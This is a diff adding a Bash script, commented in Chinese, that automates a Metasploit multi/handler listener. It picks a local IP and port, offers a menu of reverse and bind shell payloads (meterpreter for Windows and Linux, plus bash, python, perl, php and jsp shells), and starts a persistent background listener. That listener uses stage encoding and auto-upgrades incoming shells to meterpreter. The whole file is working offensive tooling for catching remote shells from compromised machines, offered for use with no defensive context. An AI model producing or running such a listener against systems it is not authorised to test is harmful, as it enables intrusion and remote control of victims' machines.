@@ -1,0 +1,62 @@
+#!/bin/bash
+
+# 显示可用的IP地址
+IPS=($(ip -4 addr show | grep inet | grep -v 127.0.0.1 | awk '{print $2}' | cut -d'/' -f1))
+for i in "${!IPS[@]}"; do
+    echo "[$i] ${IPS[$i]}"
+done
+
+# 选择IP地址
+read -p "选择IP编号 (默认 0): " ip_choice
+LHOST="${IPS[$ip_choice]:-${IPS[0]}}"
+
+# 设置端口
+read -p "输入端口 (默认 443): " LPORT
+LPORT=${LPORT:-443}
+
+# Payload列表
+PAYLOADS=(
+    "windows/meterpreter/reverse_tcp"
+    "windows/x64/meterpreter/reverse_tcp"
+    "windows/meterpreter/bind_tcp"
+    "windows/x64/meterpreter/bind_tcp"
+    "linux/x86/meterpreter/reverse_tcp"
+    "linux/x64/meterpreter/reverse_tcp"
+    "linux/x86/meterpreter/bind_tcp"
+    "linux/x64/meterpreter/bind_tcp"
+    "cmd/unix/reverse_bash"
+    "cmd/unix/reverse_python"
+    "cmd/unix/reverse_perl"
+    "cmd/unix/bind_perl"
+    "java/jsp_shell_reverse_tcp"
+    "php/meterpreter/reverse_tcp"
+    "php/reverse_php"
+    "php/bind_php"
+)
+
+# 显示Payload选项
+for i in "${!PAYLOADS[@]}"; do
+    echo "[$i] ${PAYLOADS[$i]}"
+done
+
+# 选择Payload
+read -p "选择Payload编号 (默认 0): " payload_choice
+PAYLOAD="${PAYLOADS[$payload_choice]:-${PAYLOADS[0]}}"
+
+# 启动Metasploit监听器
+echo -e "\n[*] 启动Metasploit监听器..."
+echo "[*] LHOST: $LHOST"
+echo "[*] LPORT: $LPORT"
+echo "[*] PAYLOAD: $PAYLOAD"
+echo "[*] 设置持久化监听 (ExitOnSession false)"
+
+msfconsole -q -x "use exploit/multi/handler; \
+set PAYLOAD $PAYLOAD; \
+set LHOST $LHOST; \
+set LPORT $LPORT; \
+set ExitOnSession false; \
+set EnableStageEncoding true; \
+set AutoRunScript post/multi/manage/shell_to_meterpreter; \
+exploit -j -z"
+
+echo "[*] 监听器已在后台运行，使用 'sessions -i' 查看会话"
